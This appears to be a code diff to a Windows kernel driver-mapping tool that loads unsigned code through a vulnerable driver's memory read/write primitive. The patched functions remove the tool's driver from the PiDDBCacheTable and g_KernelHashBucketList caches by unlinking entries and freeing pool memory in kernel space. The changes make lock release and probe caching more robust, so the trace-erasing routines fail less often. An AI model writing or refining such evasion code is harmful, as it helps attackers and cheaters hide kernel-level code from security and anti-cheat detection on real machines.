@@ -1780,7 +1780,11 @@ static bool ProbePteSelfMapBase() {
 	if (g_pteSelfMapProbed)
 		return g_pteSelfMapReady;
 
-	g_pteSelfMapProbed = true;
+	/* Only a successful probe is cached. A transient read failure used to set
+	 * probed=true with ready=false, so a later Load in the same process returned
+	 * the cached failure without ever retrying - permanently disabling the
+	 * read-only write primitive for this process. */
+
 	g_pteSelfMapReady = false;
 
 	if (g_mmPteBase == 0) {
@@ -1971,6 +1975,7 @@ static constexpr uint64_t kFallbackMaxPfn = 1ULL << 24;
 	}
 
 	if (kusd_ok && kusd_pfn_match && nt_ok) {
+		g_pteSelfMapProbed = true;
 		g_pteSelfMapBase = g_mmPteBase;
 		g_pdeSelfMapBase = pde_base;
 		g_pteSelfMapReady = true;
@@ -3504,6 +3509,19 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	LogBlank();
 	Log(L"[+] PiDDBLock = Locked" << std::endl);
 
+	/* Every exit has to release the lock through a checked helper. A failed
+	 * release used to be discarded, so a poisoned kernel-call primitive (or a
+	 * transient failure) let this function report success while the ERESOURCE
+	 * was still held - blocking every later PiDDB operation system wide. */
+
+	const auto release_lock = [&]() -> bool {
+		if (!ExReleaseResourceLite(PiDDBLock)) {
+			Log(L"[-] Failed to release PiDDBLock; the lock may still be held" << std::endl);
+			return false;
+		}
+		return true;
+	};
+
 	auto n = GetDriverNameW();
 
 	/*
@@ -3517,7 +3535,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	const auto provider_headers = PE::GetNtHeaders((void*)Resource::driver, sizeof(Resource::driver));
 	if (!provider_headers) {
 		Log(L"[-] The embedded provider resource is not a valid PE image" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3528,7 +3546,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	Nt::PiDDBCacheEntry* pFoundEntry = (Nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
 	if (pFoundEntry == nullptr) {
 		Log(L"[-] Not found in cache" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3539,7 +3557,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 
 	if (!IsKernelAddress((uint64_t)pFoundEntry)) {
 		Log(L"[-] PiDDBCacheTable lookup returned a non-kernel pointer, aborting cleanup" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3566,7 +3584,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 
 		if (name_field == kFieldNotFound) {
 			Log(L"[-] Could not locate the driver name inside the PiDDB entry, aborting cleanup" << std::endl);
-			ExReleaseResourceLite(PiDDBLock);
+			release_lock();
 			return false;
 		}
 
@@ -3579,13 +3597,13 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	PLIST_ENTRY prev;
 	if (!ReadMemory((uintptr_t)pFoundEntry + g_offsets.PiDDBCacheEntry_ListBlink, &prev, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't get prev entry" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 	PLIST_ENTRY next;
 	if (!ReadMemory((uintptr_t)pFoundEntry + g_offsets.PiDDBCacheEntry_ListFlink, &next, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't get next entry" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3595,7 +3613,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 
 	if (!IsKernelAddress((uint64_t)prev) || !IsKernelAddress((uint64_t)next)) {
 		Log(L"[-] PiDDBCacheTable entry links are not kernel addresses, aborting cleanup" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3610,7 +3628,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	if (!ProbeKernelRangeMapped(prev_flink_addr, sizeof(_LIST_ENTRY*)) ||
 		!ProbeKernelRangeMapped(next_blink_addr, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] PiDDBCacheTable entry neighbour link fields are not mapped, aborting cleanup" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3618,12 +3636,12 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 
 	if (!WriteMemory(prev_flink_addr, &next, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't set next entry" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 	if (!WriteMemory(next_blink_addr, &prev, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't set prev entry" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3639,7 +3657,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 		WriteMemory(prev_flink_addr, &pFoundEntry, sizeof(_LIST_ENTRY*));
 		WriteMemory(next_blink_addr, &pFoundEntry, sizeof(_LIST_ENTRY*));
 		Log(L"[-] Can't delete from PiDDBCacheTable (list links rolled back)" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 
@@ -3652,25 +3670,26 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	ULONG cacheDeleteCount = 0;
 	if (!ReadMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG))) {
 		Log(L"[-] Could not re-read PiDDBCacheTable DeleteCount, state may be inconsistent" << std::endl);
-		ExReleaseResourceLite(PiDDBLock);
+		release_lock();
 		return false;
 	}
 	if (cacheDeleteCount > 0) {
 		cacheDeleteCount--;
 		if (!WriteMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG))) {
 			Log(L"[-] Failed to decrement PiDDBCacheTable DeleteCount" << std::endl);
-			ExReleaseResourceLite(PiDDBLock);
+			release_lock();
 			return false;
 		}
 	}
 
 	// release the ddb resource lock
 
-	ExReleaseResourceLite(PiDDBLock);
+	const bool released = release_lock();
 	Log(L"[+] PiDDBCacheTable = Cleaned" << std::endl);
-	Log(L"[+] PiDDBLock = Released" << std::endl);
+	if (released)
+		Log(L"[+] PiDDBLock = Released" << std::endl);
 
-	return true;
+	return released;
 }
 
 /*
@@ -3723,21 +3742,33 @@ bool Driver::ClearKernelHashBucketList() {
 	}
 	Log(L"[+] g_HashCacheLock = Locked" << std::endl);
 
+	/* A failed release is retried, because a transient provider failure (or a
+	 * poisoned kernel-call primitive) must not leave an auto-boosted ERESOURCE
+	 * owned by a process that is about to exit - that is the 0x13C condition
+	 * documented further down. Every exit below reports failure if the lock
+	 * could not be released, including the "list is empty" success path. */
+
+	const auto release_lock = [&]() -> bool {
+		for (int attempt = 0; attempt < 3; ++attempt) {
+			if (ExReleaseResourceLite(g_HashCacheLock))
+				return true;
+		}
+		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+		return false;
+	};
+
 	Nt::HashBucketEntry* prev = (Nt::HashBucketEntry*)g_KernelHashBucketList;
 	Nt::HashBucketEntry* entry = 0;
 	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(PVOID))) {
 		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
-		if (!ExReleaseResourceLite(g_HashCacheLock)) {
+		if (!release_lock()) {
 			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 		}
 		return false;
 	}
 	if (!entry) {
 		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
-		if (!ExReleaseResourceLite(g_HashCacheLock)) {
-			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
-		}
-		return true;
+		return release_lock();
 	}
 
 	std::wstring wdname = GetDriverNameW();
@@ -3780,7 +3811,7 @@ bool Driver::ClearKernelHashBucketList() {
 		if (++walked > kMaxHashBucketEntries) {
 			Log(L"[-] g_KernelHashBucketList walk exceeded " << Val(kMaxHashBucketEntries)
 				<< L" entries; the list is circular or corrupt" << std::endl);
-			if (!ExReleaseResourceLite(g_HashCacheLock)) {
+			if (!release_lock()) {
 				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 			}
 			return false;
@@ -3799,7 +3830,7 @@ bool Driver::ClearKernelHashBucketList() {
 			!ProbeKernelRangeMapped((uint64_t)entry, sizeof(Nt::HashBucketEntry))) {
 			Log(L"[-] g_KernelHashBucketList entry " << Val(reinterpret_cast<void*>(entry))
 				<< L" is not a mapped kernel address, aborting" << std::endl);
-			if (!ExReleaseResourceLite(g_HashCacheLock)) {
+			if (!release_lock()) {
 				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 			}
 			return false;
@@ -3808,7 +3839,7 @@ bool Driver::ClearKernelHashBucketList() {
 		USHORT wsNameLen = 0;
 		if (!ReadMemory((uintptr_t)entry + g_offsets.HashBucketEntry_DriverName, &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
 			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
-			if (!ExReleaseResourceLite(g_HashCacheLock)) {
+			if (!release_lock()) {
 				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 			}
 			return false;
@@ -3833,7 +3864,7 @@ bool Driver::ClearKernelHashBucketList() {
 			wchar_t* wsNamePtr = 0;
 			if (!ReadMemory((uintptr_t)entry + g_offsets.HashBucketEntry_DriverName + offsetof(UNICODE_STRING, Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
 				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
-				if (!ExReleaseResourceLite(g_HashCacheLock)) {
+				if (!release_lock()) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 				}
 				return false;
@@ -3852,7 +3883,7 @@ bool Driver::ClearKernelHashBucketList() {
 				!ProbeKernelRangeMapped((uint64_t)wsNamePtr, wsNameLen)) {
 				Log(L"[-] g_KernelHashBucketList entry text ptr " << Val(reinterpret_cast<void*>(wsNamePtr))
 					<< L" is not a mapped kernel address, refusing to read it" << std::endl);
-				if (!ExReleaseResourceLite(g_HashCacheLock)) {
+				if (!release_lock()) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 				}
 				return false;
@@ -3861,7 +3892,7 @@ bool Driver::ClearKernelHashBucketList() {
 			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
 			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
 				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
-				if (!ExReleaseResourceLite(g_HashCacheLock)) {
+				if (!release_lock()) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 				}
 				return false;
@@ -3891,7 +3922,7 @@ bool Driver::ClearKernelHashBucketList() {
 				Nt::HashBucketEntry* Next = 0;
 				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(PVOID))) {
 					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
-					if (!ExReleaseResourceLite(g_HashCacheLock)) {
+					if (!release_lock()) {
 						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 					}
 					return false;
@@ -3899,7 +3930,7 @@ bool Driver::ClearKernelHashBucketList() {
 
 				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(PVOID))) {
 					Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
-					if (!ExReleaseResourceLite(g_HashCacheLock)) {
+					if (!release_lock()) {
 						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 					}
 					return false;
@@ -3907,13 +3938,13 @@ bool Driver::ClearKernelHashBucketList() {
 
 				if (!FreePool((uintptr_t)entry)) {
 					Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
-					if (!ExReleaseResourceLite(g_HashCacheLock)) {
+					if (!release_lock()) {
 						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 					}
 					return false;
 				}
 				Log(L"[+] g_KernelHashBucketList = Cleaned" << std::endl);
-				if (!ExReleaseResourceLite(g_HashCacheLock)) {
+				if (!release_lock()) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 					return false;
 				}
@@ -3927,7 +3958,7 @@ bool Driver::ClearKernelHashBucketList() {
 
 		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(PVOID))) {
 			Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
-			if (!ExReleaseResourceLite(g_HashCacheLock)) {
+			if (!release_lock()) {
 				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 			}
 			return false;
@@ -3949,7 +3980,7 @@ bool Driver::ClearKernelHashBucketList() {
 	 * complete and the state of the list is unknown.
 	 */
 
-	if (!ExReleaseResourceLite(g_HashCacheLock)) {
+	if (!release_lock()) {
 		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 		return false;
 	}
